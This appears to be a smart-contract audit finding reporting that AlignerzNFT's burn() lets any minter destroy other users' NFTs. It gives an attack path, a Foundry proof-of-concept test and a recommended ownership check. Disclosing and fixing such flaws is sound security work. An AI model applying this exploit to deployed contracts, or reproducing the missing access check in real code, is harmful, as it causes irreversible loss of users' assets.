# [000926] [H-2] Unauthorized Minter Can Burn Any User’s NFT
  
  ### Summary

The burn() function in AlignerzNFT allows minters to destroy any user's NFT without verifying ownership, enabling irreversible loss of user assets. There is no check to ensure the caller owns the token or is an approved operator.

### Root Cause

In AlignerzNFT.sol, the burn() function allows any address with the minter role to burn NFTs without verifying ownership. The function lacks a check to ensure that the caller is either the token owner or an approved operator, giving minters unrestricted permission to destroy any user’s NFT. This is a coding-level access control oversight.

Code Link : https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/nft/AlignerzNFT.sol#L121-L124

### Internal Pre-conditions

_No response_

### External Pre-conditions

_No response_

### Attack Path



1. **Owner** calls `addMinter(attacker)` and grants the attacker the `minter` role.
2. **A regular user** mints an NFT, making `ownerOf(tokenId) = user`.
3. **Contract remains unpaused**, so `whenNotPaused` does not block actions.
4. **Attacker (as a minter)** calls `burn(tokenId)` on a token they do **not** own.
5. The `burn()` function only checks `onlyMinter` and `_exists(tokenId)` — **no owner or approval check**.
6. `_burn(tokenId)` executes successfully and **irreversibly destroys the user’s NFT**.




### Impact

Any authorized minter can permanently burn NFTs belonging to other users. This leads to irreversible token loss, effectively amounting to theft or destruction of users’ assets. It undermines trust in the protocol and can severely damage user confidence and project reputation.

### PoC

1. Create a AlignerzNFT.t.sol file inside Test folder .
2.  Run the test using:

```solidity
forge test --match-test test_MinterCanBurnAnyUsersToken --match-path test/AlignerzNFT.t.sol -vvvv
```

```solidity 
// SPDX-License-Identifier: MIT
pragma solidity =0.8.29;

import "forge-std/Test.sol";
import "../src/contracts/nft/AlignerzNFT.sol";

import "../src/contracts/nft/ERC721A.sol"; 



contract AlignerzNFT_PoC is Test {
    AlignerzNFT nft;
    address owner = address(0x1);
    address user = makeAddr("user");
    address maliciousMinter = makeAddr("maliciousMinter");

    uint256 tokenId; 

    function setUp() public {
        vm.startPrank(owner);

        nft = new AlignerzNFT("Alignerz", "ALGZ", "ipfs://baseuri/");

        nft.addMinter(maliciousMinter);

        tokenId = nft.mint(user);

        vm.stopPrank();

        assertEq(nft.ownerOf(tokenId), user);
        console.log("Minted token ID:", tokenId);
        console.log("Owner of token:", nft.ownerOf(tokenId));
    }

    function test_MinterCanBurnAnyUsersToken() public {
        console.log("Before burn - Owner:", nft.ownerOf(tokenId));

        vm.prank(maliciousMinter);
        nft.burn(tokenId);

        vm.expectRevert();
        nft.ownerOf(tokenId);

    }
}
```

### Mitigation

The burn() function should be restricted so that only the token owner or an explicitly approved operator can burn a token. Minters must not have any destructive authority over user‑owned NFTs. To fix this, introduce an ownership/approval check inside burn() and ensure the call reverts if the caller is not the token owner, not getApproved(tokenId), and not an approved operator via isApprovedForAll. If the project requires privileged burning, add a separate, dedicated BURNER_ROLE instead of granting this power to minters. Additionally, review all role permissions to ensure minters are strictly limited to minting operations and cannot affect or destroy user assets.
  